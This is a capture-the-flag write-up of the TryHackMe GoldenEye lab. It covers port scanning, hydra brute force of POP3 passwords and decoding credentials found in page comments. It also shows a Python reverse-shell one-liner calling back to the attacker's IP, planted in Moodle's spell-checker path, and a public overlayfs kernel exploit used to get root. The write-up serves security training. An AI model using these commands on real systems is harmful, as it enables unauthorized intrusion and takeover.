---
title: "TryHackMe - GoldenEye"
author: Nasrallah
description: ""
date: 2022-11-13 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, medium]
img_path: /assets/img/tryhackme/goldeneye
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [GoldenEye](https://tryhackme.com/room/goldeneye) from [TryHackMe](https://tryhackme.com).

## **Enumeration**

### nmap

We start a nmap scan for all ports using the following command: `sudo nmap --min-rate 5000 -p- {target_IP}`.

```terminal
Nmap scan report for 10.10.184.85
Host is up (0.089s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE    SERVICE
25/tcp    open     smtp
80/tcp    open     http
36582/tcp filtered unknown
55006/tcp open     unknown
55007/tcp open     unknown
```

Found 4 open ports, now let's run a service scan with default scripts:`sudo nmap -sC -sV -T4 -p 25,80,55006,55007 {Target_IP}`

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

- -p: Specify ports.

```terminal
Nmap scan report for 10.10.184.85
Host is up (0.086s latency).

PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: UIDL AUTH-RESP-CODE TOP USER SASL(PLAIN) PIPELINING RESP-CODES CAPA
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: PIPELINING STLS USER SASL(PLAIN) RESP-CODES CAPA TOP UIDL AUTH-RESP-CODE
```

We server is running an Apache http server on port 80, and we see smtp and pop3 running which mean there is a mail server running also.

### Web

Let's check the web page.

![](1.png)

We got some red text with a location for a login page. Let's check the source code.

![](2.png)

Found a javascript file, let's check it out.

```js
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

This is the code that displays the text, but we found some interesting comments where we discover 2 username, `Boris` and `Natalya`.

We got Boris's password but it's encoded.

I tried to decode it on `CyberChef` using magic and managed to get the password.

![](3.png)

This type of encoding is called `html entities`, which are characters that are used to display reserved characters in HTML.

Now let's go to the login page.

![](4.png)

Nothing can be found here that we don't already know. Let's move on.

### Mail

Let's try logging in to the pop3 server using the same credentials.

![](5.png)

Password didn't work, let's brute force it using hydra.

```bash
hydra -l {username} -P /usr/share/wordlists/fasttrack.txt {Target_IP} pop3 -s 55007 
```

![](6.png)

We found Boris's password, let's login.

![](7.png)

We found 3 email, but nothing really useful can be found.

Let's brute force natalya's password.

![](8.png)

We got it, now let's see what we can find.

![](9.png)

We found 2 emails, the second one reveals a domain name;`severnaya-station.com/gnocertdir`. We also found a username and a password.

Let's add the domain name to our /etc/hosts file and navigate to it.

![](10.png)

Let's login with the credentials we found.

![](11.png)

Once logged in, we see that we have a message from someone called Dr Doak.

![](12.png)

He said his username is `doak`, let's brute force the password with hydra.

![](13.png)

Let's check his pop3 email.

![](14.png)

We found his credentials for the website, let's login.

![](15.png)

We found secret file on Doak's private file, let's check it out.

```text
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

Let's download the image with the following command: `http://severnaya-station.com/dir007key/for-007.jpg`

I tried to extract any hidden files but couldn't, Let's check the exif data with `exiftool`.

![](16.png)

We found the password, let's login as admin.

![](17.png)


## **Foothold**

We now that Aspell is installed, so let's set it up to give a reverse shell.

First, go to the search bar and type `spell`.

![](18.png)

Change the spell engine to `PSpellShell`, and enter the following command into `Path to Spell`.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.18.0.188",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Click save and setup a listener with `nc -lvnp 9001` 

Now go to My profile -> Blogs -> Add new Entry, then click the ABC button.

![](19.png)

Back the the listener we should see a shell.

![](20.png)

## **Privilege Escalation**

Let's check the kernel version with the command `uname -a`.

```terminal
www-data@ubuntu:/$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

This version is vulnerable to overlayfs, we can find the exploit [here](https://www.exploit-db.com/exploits/37292).

Upload the exploit to the target and let's compile it and run it.

```terminal
www-data@ubuntu:/tmp$ gcc ofs.c -o ofs
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
```

`gcc` is not installed, so we can replace it with `cc`, but first replace `gcc` in the code with `cc`.

![](21.png)

Now we can compile and run the exploit to get root.

![](22.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
